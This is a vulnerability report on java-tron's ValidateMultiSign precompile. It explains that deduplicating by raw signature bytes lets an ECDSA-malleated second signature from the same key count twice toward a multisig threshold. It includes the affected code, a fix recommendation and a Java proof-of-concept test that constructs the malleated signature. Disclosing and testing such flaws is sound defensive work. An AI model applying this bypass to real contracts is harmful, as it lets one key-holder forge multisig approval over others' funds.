### Title
Multisig threshold bypass via ECDSA signature malleability in `ValidateMultiSign` precompile duplicate-signature detection - ([File: actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java])

### Summary
`PrecompiledContracts.ValidateMultiSign.execute` deduplicates signatures by exact byte-array comparison of `merge(recoveredAddr, sign)`, not by the recovered signer address alone. Because raw ECDSA signatures are malleable (an alternate valid `(r, n-s, v')` encoding recovers to the same address as the original `(r, s, v)`), an attacker holding one real key can submit two byte-distinct signatures that both recover to their address, and the loop counts that signer's weight twice toward `permission.getThreshold()`.

### Finding Description
In the signature-processing loop: [1](#0-0) 

```java
long totalWeight = 0L;
List<byte[]> executedSignList = new ArrayList<>();
for (byte[] sign : signatures) {
  byte[] recoveredAddr = recoverAddrBySign(sign, hash);
  sign = merge(recoveredAddr, sign);
  if (ByteArray.matrixContains(executedSignList, recoveredAddr)) {
    if (ByteArray.matrixContains(executedSignList, sign)) {
      continue;
    }
    MUtil.checkCPUTime();
  }
  long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
  ...
  totalWeight += weight;
  executedSignList.add(sign);
  executedSignList.add(recoveredAddr);
}
```

`ByteArray.matrixContains` performs an exact `Arrays.equals` comparison of the raw byte arrays: [2](#0-1) 

The dedup logic only `continue`s (skips weight accrual) when the exact same `recoveredAddr` **and** the exact same merged signature bytes have already been seen. If `recoveredAddr` was already seen but the *raw signature bytes* differ — which is trivially achievable via ECDSA signature malleability (transforming `(r, s, v)` into the mathematically equivalent `(r, n−s, v')`, which recovers to the identical public key/address but is a syntactically different byte array) — the code does **not** skip; it only calls `MUtil.checkCPUTime()` (an anti-DoS timing check, not an authorization check) and then falls through to compute `weight = TransactionCapsule.getWeight(permission, recoveredAddr)` and add it to `totalWeight` again: [3](#0-2) 

`getWeight` looks up weight purely by address, so a second malleated signature from the same key yields the same nonzero weight, which is then double-counted. This directly violates the invariant that `totalWeight >= permission.getThreshold()` must reflect distinct authorized signers.

The existing regression test only exercises *literal* duplicate signatures (identical raw bytes from calling `key1.sign(toSign)` twice, which — with deterministic k — produces byte-identical output), which is correctly deduplicated: [4](#0-3) 
This test does not cover the malleated-signature case, so the gap is unguarded.

### Impact Explanation
An attacker who controls a single active/owner-permission key whose weight is below `permission.getThreshold()` can craft a second, distinct-byte malleated signature for the same key and submit both via the `ValidateMultiSign` precompile (address `0x...a`). This makes `execute` return `dataOne()` (success) even though only one real signer authorized the request, allowing on-chain smart contracts that gate arbitrary owner/active-permission actions behind `ValidateMultiSign` to be tricked into believing multisig threshold was met with insufficient real, distinct signers.

### Likelihood Explanation
Fully attacker-controlled and requires no privileged access: the attacker only needs (1) a real active key with weight less than the permission threshold, and (2) knowledge of the target's public multisig permission (queryable via TVM/`getAccount`). Deriving the malleated `(r, n−s, v')` counterpart of a valid ECDSA signature is a standard, well-documented operation requiring no private key access beyond the attacker's own key, making this deterministic and repeatable in every call.

### Recommendation
Change the deduplication logic to key exclusively on `recoveredAddr` instead of on the raw signature bytes — i.e., once an address has contributed weight, any further signature (malleated or not) recovering to that same address must be skipped entirely, not merely subjected to a CPU-time check. Concretely, replace the inner `matrixContains(executedSignList, sign)`/`continue` logic with a single check: if `matrixContains(executedSignList, recoveredAddr)` is true, always `continue` (skip weight accrual) regardless of raw signature bytes.

### Proof of Concept
Extend `ValidateMultiSignContractTest` with a test using two byte-distinct signatures from the same key that recover to the same address via ECDSA malleability:

```java
@Test
public void testMalleatedSignatureDoubleCounted() {
  ECKey key = new ECKey();
  AccountCapsule toAccount = new AccountCapsule(ByteString.copyFrom(key.getAddress()),
      Protocol.AccountType.Normal, System.currentTimeMillis(), true,
      dbManager.getDynamicPropertiesStore());

  ECKey key1 = new ECKey(); // weight 1
  ECKey key2 = new ECKey(); // weight 1, NOT controlled by attacker

  Protocol.Permission activePermission = Protocol.Permission.newBuilder()
      .setType(Protocol.Permission.PermissionType.Active)
      .setId(2).setPermissionName("active").setThreshold(2)
      .setOperations(ByteString.copyFrom(ByteArray.fromHexString(
          "0000000000000000000000000000000000000000000000000000000000000000")))
      .addKeys(Protocol.Key.newBuilder().setAddress(ByteString.copyFrom(key1.getAddress())).setWeight(1).build())
      .addKeys(Protocol.Key.newBuilder().setAddress(ByteString.copyFrom(key2.getAddress())).setWeight(1).build())
      .build();
  toAccount.updatePermissions(toAccount.getPermissionById(0), null,
      Collections.singletonList(activePermission));
  dbManager.getAccountStore().put(key.getAddress(), toAccount);

  byte[] data = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), longData);
  byte[] merged = ByteUtil.merge(key.getAddress(), ByteArray.fromInt(2), data);
  byte[] toSign = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), merged);

  ECKey.ECDSASignature sig = key1.sign(toSign);
  // Malleate: s' = N - s, flip recovery id -> different raw bytes, same recovered address
  BigInteger sPrime = ECKey.CURVE.getN().subtract(sig.s);
  ECKey.ECDSASignature malleated = new ECKey.ECDSASignature(sig.r, sPrime);
  malleated.v = (byte) (sig.v == 27 ? 28 : 27); // flip parity to keep same recovered pubkey

  List<Object> signs = new ArrayList<>();
  signs.add(Hex.toHexString(sig.toByteArray()));         // key1's real signature
  signs.add(Hex.toHexString(malleated.toByteArray()));   // byte-distinct, same signer

  // Only ONE real distinct signer's weight (1) should count; threshold is 2.
  Assert.assertArrayEquals(
      "Expected DATA_FALSE: malleated signature must not double-count key1's weight",
      validateMultiSign(StringUtil.encode58Check(key.getAddress()), 2, data, signs).getValue(),
      DataWord.ZERO().getData());
}
```

Expected (correct) behavior: assertion passes with `DATA_FALSE` because only one distinct signer's weight (1) is below threshold (2). Under the current vulnerable code, `execute` returns `DATA_ONE` because `totalWeight` is incorrectly computed as `1 + 1 = 2`, satisfying the threshold with only one real signer — demonstrating the bypass.

### Citations

**File:** actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java (L1086-1106)
```java
            long totalWeight = 0L;
            List<byte[]> executedSignList = new ArrayList<>();
            for (byte[] sign : signatures) {
              byte[] recoveredAddr = recoverAddrBySign(sign, hash);

              sign = merge(recoveredAddr, sign);
              if (ByteArray.matrixContains(executedSignList, recoveredAddr)) {
                if (ByteArray.matrixContains(executedSignList, sign)) {
                  continue;
                }
                MUtil.checkCPUTime();
              }
              long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
              if (weight == 0) {
                //incorrect sign
                return Pair.of(true, DATA_FALSE);
              }
              totalWeight += weight;
              executedSignList.add(sign);
              executedSignList.add(recoveredAddr);
            }
```

**File:** common/src/main/java/org/tron/common/utils/ByteArray.java (L189-196)
```java
  public static boolean matrixContains(List<byte[]> source, byte[] obj) {
    for (byte[] sobj : source) {
      if (Arrays.equals(sobj, obj)) {
        return true;
      }
    }
    return false;
  }
```

**File:** chainbase/src/main/java/org/tron/core/capsule/TransactionCapsule.java (L218-226)
```java
  public static long getWeight(Permission permission, byte[] address) {
    List<Key> list = permission.getKeysList();
    for (Key key : list) {
      if (key.getAddress().equals(ByteString.copyFrom(address))) {
        return key.getWeight();
      }
    }
    return 0;
  }
```

**File:** framework/src/test/java/org/tron/common/runtime/vm/ValidateMultiSignContractTest.java (L117-125)
```java
    List<Object> signs = new ArrayList<>();
    signs.add(Hex.toHexString(key1.sign(toSign).toByteArray()));
    //add Repetitive
    signs.add(Hex.toHexString(key1.sign(toSign).toByteArray()));
    signs.add(Hex.toHexString(key2.sign(toSign).toByteArray()));

    Assert.assertArrayEquals(
        validateMultiSign(StringUtil.encode58Check(key.getAddress()), permissionId, data, signs)
            .getValue(), DataWord.ONE().getData());
```
